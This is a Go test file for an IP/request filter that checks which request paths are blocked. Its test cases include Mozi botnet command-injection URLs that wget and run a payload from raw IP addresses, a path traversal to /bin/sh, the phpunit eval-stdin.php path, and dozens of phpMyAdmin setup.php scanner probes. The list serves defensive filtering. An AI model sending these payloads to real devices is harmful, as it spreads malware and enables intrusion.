package ipfilter

import (
	"fmt"
	"testing"
)

func Test_contains(t *testing.T) {

	tests := []struct {
		item string
		want bool
	}{
		{"/favicon.ico", false},
		{"/", false},
		{"/version", false},
		{"/view?platform=atari", false},
		{"/viewFull", false},
		{"/board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://121.202.194.65:51569/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron", true},
		{"/cgi-bin/../../../../bin/sh", true},
		{"/setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://124.123.71.60:52333/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1", true},
		{"/cgi-bin/authLogin.cgi", true},
	}
	for _, tt := range tests {
		t.Run(fmt.Sprintf("Filter out %+v", _BANNED_STRINGS), func(t *testing.T) {
			if got := contains(_BANNED_STRINGS, tt.item); got != tt.want {
				t.Errorf("contains(%s) = %v, want %v", tt.item, got, tt.want)
			}
		})
	}
}

func Test_beginsWith(t *testing.T) {

	Init()
	tests := []struct {
		item string
		want bool
	}{
		{"/favicon.ico", false},
		{"/", false},
		{"/version", false},
		{"/view?platform=atari", false},
		{"/viewFull", false},
		{"/cgi-bin/../../../../bin/sh", true},
		{"/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php", true},
		{"/dbadmin/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.3/scripts/setup.php", true},
		{"/phpMyAdmin-2/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.9.2/scripts/setup.php", true},
		{"/phpMyAdmin-2.8.0.2/scripts/setup.php", true},
		{"/MyAdmin/scripts/setup.php", true},
		{"/phpMyAdmin/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.1.2/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.7/scripts/setup.php", true},
		{"/mysqladmin/scripts/setup.php", true},
		{"/admin/pma/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.0/scripts/setup.php", true},
		{"/phpMyAdmin2/scripts/setup.php", true},
		{"/admin/scripts/setup.php", true},
		{"/phpmyadmin/scripts/setup.php", true},
		{"/phpMyAdmin-2.11.4/scripts/setup.php", true},
		{"/PHPMYADMIN/scripts/setup.php", true},
		{"/SQL/scripts/setup.php", true},
		{"/myadmin/scripts/setup.php", true},
		{"/phpMyAdmin-2.10.3/scripts/setup.php", true},
		{"/web/phpMyAdmin/scripts/setup.php", true},
		{"/webadmin/scripts/setup.php", true},
		{"/mysqlmanager/scripts/setup.php", true},
		{"/phpmanager/scripts/setup.php", true},
		{"/phpmy-admin/scripts/setup.php", true},
		{"/phpMyAdmin-2.5.4/scripts/setup.php", true},
		{"/webdb/scripts/setup.php", true},
		{"/sqlmanager/scripts/setup.php", true},
		{"/phpMyAdmin-2.10.0.2/scripts/setup.php", true},
		{"/mysql/scripts/setup.php", true},
		{"/phpMyAdmin-2.5.5-pl1/scripts/setup.php", true},
		{"/mysql-admin/scripts/setup.php", true},
		{"/phpMyAdmin-2.5.5/scripts/setup.php", true},
		{"/admin/phpmyadmin/scripts/setup.txt", true},
		{"/_phpMyAdmin/scripts/setup.php", true},
		{"/phpMyAdmin-2.5.7-pl1/scripts/setup.php", true},
		{"/pma/scripts/setup.php", true},
		{"/php/scripts/setup.php", true},
		{"/phpMyAdmin-2.10.2/scripts/setup.php", true},
		{"/phpma/scripts/setup.php", true},
		{"/phpMyAdmin3/scripts/setup.php", true},
		{"/sqlweb/scripts/setup.php", true},
		{"/db/scripts/setup.php", true},
		{"/websql/scripts/setup.php", true},
		{"/php-myadmin/scripts/setup.php", true},
	}
	for _, tt := range tests {
		t.Run(fmt.Sprintf("Filter out %+v", _BANNED_BEGINS), func(t *testing.T) {
			if got := beginsWith(_BANNED_BEGINS, tt.item); got != tt.want {
				t.Errorf("beginsWith(%s) = %v, want %v", tt.item, got, tt.want)
			}
		})
	}
}
